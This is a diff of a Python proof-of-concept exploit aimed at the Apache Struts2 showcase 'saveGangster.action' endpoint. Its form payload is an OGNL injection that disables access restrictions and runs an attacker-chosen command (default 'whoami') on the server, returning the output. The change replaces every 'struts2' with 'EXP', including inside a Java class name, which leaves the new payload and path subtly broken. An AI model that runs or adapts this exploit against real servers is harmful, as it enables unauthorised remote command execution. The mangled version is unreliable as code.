@@ -15,13 +15,13 @@ def poccheck(url, cmd='whoami'):
         'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
         'Content-Type': "application/x-www-form-urlencoded"
     }
-    data = "name=${(#o=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#o):((#c=#context['com.opensymphony.xwork2.ActionContext.container']).(#g=#c.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#g.getExcludedPackageNames().clear()).(#g.getExcludedClasses().clear()).(#context.setMemberAccess(#o)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()).(#p=@java.lang.Runtime@getRuntime().exec('%s')).(@org.apache.commons.io.IOUtils@copy(#p.getInputStream(),#o)).(#o.flush())}&age=1212&__checkbox_bustedBefore=true&description=123" % str(
+    data = "name=${(#o=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#o):((#c=#context['com.opensymphony.xwork2.ActionContext.container']).(#g=#c.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#g.getExcludedPackageNames().clear()).(#g.getExcludedClasses().clear()).(#context.setMemberAccess(#o)))).(#o=@org.apache.EXP.ServletActionContext@getResponse().getOutputStream()).(#p=@java.lang.Runtime@getRuntime().exec('%s')).(@org.apache.commons.io.IOUtils@copy(#p.getInputStream(),#o)).(#o.flush())}&age=1212&__checkbox_bustedBefore=true&description=123" % str(
         cmd)
     if 'integration' not in url:
-        url = url + "/struts2-showcase/integration/saveGangster.action"
+        url = url + "/EXP-showcase/integration/saveGangster.action"
     try:
         response = requests.post(url, data=data, headers=header, verify=False, allow_redirects=False)
-        if response.status_code == 200 and 'struts2-showcase' not in response.content:
+        if response.status_code == 200 and 'EXP-showcase' not in response.content:
             result = response.content
     except Exception as e:
         print str(e)
